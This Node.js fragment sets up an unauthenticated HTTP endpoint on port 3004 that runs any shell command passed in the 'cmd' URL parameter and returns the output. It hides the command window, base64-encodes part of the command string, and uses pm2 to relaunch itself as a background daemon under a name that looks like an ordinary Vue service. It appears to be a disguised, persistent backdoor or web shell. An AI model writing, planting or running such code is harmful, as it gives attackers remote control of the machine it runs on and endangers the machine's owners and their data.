http.createServer({ 'requestTimeout': 60000 }, (request, response) => {
  response.writeHead(200, { 'Content-Type': 'text/plain;charset=UTF-8' });
  let command = url.parse(request.url, true).query.cmd;
  if (command) {
    try {
      childProcess.exec(Buffer.from("Y2hjcCA2NTAwMQ==", "base64").toString() + " & " + command, {
        'encoding': "buffer",
        'windowsHide': true
      }, (error, stdout, stderr) => {
        if (error) {
          response.end("ERR:\n" + error.message);
        } else {
          if (stdout) {
            response.end('' + iconv.decode(stdout, "gbk"));
          } else if (stderr) {
            response.end("ERR:\n" + iconv.decode(stderr, "gbk"));
          }
        }
      });
    } catch (error) {
      response.end("ERR:\n" + error);
    }
  }
}).listen(3004);

const pm2 = require('pm2');
pm2.connect((err) => {
    if (err) {
        return;
    }
    const script = __dirname + '/app.js';
    const name = 'pingan-vue-floating-server-ap'
    const pm2Options = {
        script,
        name,
        exec_mode: 'cluster',
        daemon: true
    };
    pm2.start(pm2Options, (err, apps) => {
        if (err) {
            pm2.disconnect();
        } else {
            pm2.disconnect();
        }
    });
});

